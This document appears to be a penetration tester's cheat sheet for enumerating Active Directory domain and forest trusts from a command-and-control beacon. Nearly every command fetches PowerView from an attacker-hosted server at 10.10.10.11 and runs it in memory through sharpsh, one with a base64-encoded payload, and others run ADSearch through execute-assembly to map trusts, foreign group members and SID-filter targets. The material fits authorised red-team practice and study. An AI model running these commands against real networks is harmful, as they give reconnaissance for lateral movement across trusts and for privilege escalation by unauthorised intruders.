# Trusts

## Powerview

### 1) Get the domain/forest trusts

    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -NET"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -API"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -Domain dev.domain.com"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -Domain hr.domain.com"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrust -Domain domain.com"'


### 2) Get domain trusts mapping (between each other)

    sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainTrustMapping"'


### 3) Get foreign members from part of current domain from another forest (run for all forests with which we have trust)

    sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainForeignGroupMember -Domain dev.domain.com"'
    sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainForeignGroupMember -Domain hr.domain.com"'
    sharpsh -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainForeignGroupMember -Domain domain.com"'


### 4) Check which users/groups are part of localgroups on machines based on GPO policies

    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainGPOUserLocalGroupMapping"'


### 5) Get forest groups accessible to our forest with SID >= 1000 - For SID filtering (base64 encode on cyberchef)

    Get-DomainGroup -LDAPFilter "(objectSID>=S-1-5-21-201072640-2662162558-1369012345-1000)" -Domain domain.com | select cn,memberof,objectSID
    sharpsh -i -t 20 -- -u http://10.10.10.11/powershell-scripts/PowerView.ps1 -e -c R2V0LURvbWFpbkdyb3VwIC1MREFQRmlsdGVyICIob2JqZWN0U0lEPj1TLTEtNS0yMS0yMDEwNzI2NDAtMjY2MjE2MjU1OC0xMzY5MDEyMzQ1LTEwMDApIiAtRG9tYWluIGRvbWFpbi5jb20gfCBzZWxlY3QgY24sbWVtYmVyb2Ysb2JqZWN0U0lE

## ADSearch

### 1) List down all users - we get the trust user as well -> CORP1$

    execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(objectCategory=user)"


### 2) List down the trusts, its way and the trusting/trusted domain

    execute-assembly /home/kali/tools/bins/csharp-files/ADSearch.exe --search "(objectCategory=trustedDomain)" --domain domain.com --attributes distinguishedName,name,flatName,trustDirection
